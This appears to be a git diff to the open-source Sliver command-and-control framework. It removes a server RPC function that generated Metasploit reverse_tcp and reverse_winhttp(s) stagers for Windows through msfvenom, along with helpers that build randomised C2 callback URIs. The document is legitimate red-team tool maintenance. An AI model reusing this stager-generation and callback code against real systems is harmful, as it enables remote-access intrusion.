@@ -20,16 +20,10 @@ package rpc
 
 import (
 	"context"
-	"errors"
-	"fmt"
-	"math/rand"
-	"path"
-	"time"
 
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/bishopfox/sliver/server/codenames"
 	"github.com/bishopfox/sliver/server/core"
 	"github.com/bishopfox/sliver/server/db"
 	"github.com/bishopfox/sliver/server/log"
@@ -142,103 +136,4 @@ func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*
 		return nil, err
 	}
 	return resp, nil
-}
-
-// MsfStage - Generate a MSF compatible stage
-func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*clientpb.MsfStager, error) {
-	var (
-		MSFStage = &clientpb.MsfStager{
-			File: &commonpb.File{},
-		}
-		payload string
-		arch    string
-		uri     string
-	)
-
-	switch req.GetArch() {
-	case "amd64":
-		arch = "x64"
-	default:
-		arch = "x86"
-	}
-
-	switch req.Protocol {
-	case clientpb.StageProtocol_TCP:
-		payload = "meterpreter/reverse_tcp"
-	case clientpb.StageProtocol_HTTP:
-		payload = "custom/reverse_winhttp"
-		uri = generateCallbackURI(req.HTTPC2ConfigName)
-	case clientpb.StageProtocol_HTTPS:
-		payload = "custom/reverse_winhttps"
-		uri = generateCallbackURI(req.HTTPC2ConfigName)
-	default:
-		return MSFStage, errors.New("protocol not supported")
-	}
-
-	// We only support windows at the moment
-	if req.GetOS() != "windows" {
-		return MSFStage, fmt.Errorf("%s is currently not supported", req.GetOS())
-	}
-
-	venomConfig := msf.VenomConfig{
-		Os:         req.GetOS(),
-		Payload:    payload,
-		LHost:      req.GetHost(),
-		LPort:      uint16(req.GetPort()),
-		Arch:       arch,
-		Format:     req.GetFormat(),
-		BadChars:   req.GetBadChars(), // TODO: make this configurable
-		Luri:       uri,
-		AdvOptions: req.AdvOptions,
-	}
-
-	stage, err := msf.VenomPayload(venomConfig)
-	if err != nil {
-		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
-		return MSFStage, err
-	}
-	MSFStage.File.Data = stage
-	name, err := codenames.GetCodename()
-	if err != nil {
-		return MSFStage, err
-	}
-	MSFStage.File.Name = name
-	return MSFStage, nil
-}
-
-// Utility functions
-func generateCallbackURI(httpC2ConfigName string) string {
-	httpC2Config, err := db.LoadHTTPC2ConfigByName(httpC2ConfigName)
-	if err != nil {
-		return ""
-	}
-	segments := httpC2Config.ImplantConfig.PathSegments
-	StageFiles := []string{}
-	StagePaths := []string{}
-
-	for _, segment := range segments {
-		if segment.SegmentType == 3 {
-			if segment.IsFile {
-				StageFiles = append(StageFiles, segment.Value)
-			} else {
-				StagePaths = append(StagePaths, segment.Value)
-			}
-		}
-	}
-
-	return path.Join(randomPath(StagePaths, StageFiles)...)
-}
-
-func randomPath(segments []string, filenames []string) []string {
-	seed := rand.NewSource(time.Now().UnixNano())
-	insecureRand := rand.New(seed)
-	n := insecureRand.Intn(3) // How many segments?
-	genSegments := []string{}
-	for index := 0; index < n; index++ {
-		seg := segments[insecureRand.Intn(len(segments))]
-		genSegments = append(genSegments, seg)
-	}
-	filename := filenames[insecureRand.Intn(len(filenames))]
-	genSegments = append(genSegments, filename)
-	return genSegments
 }
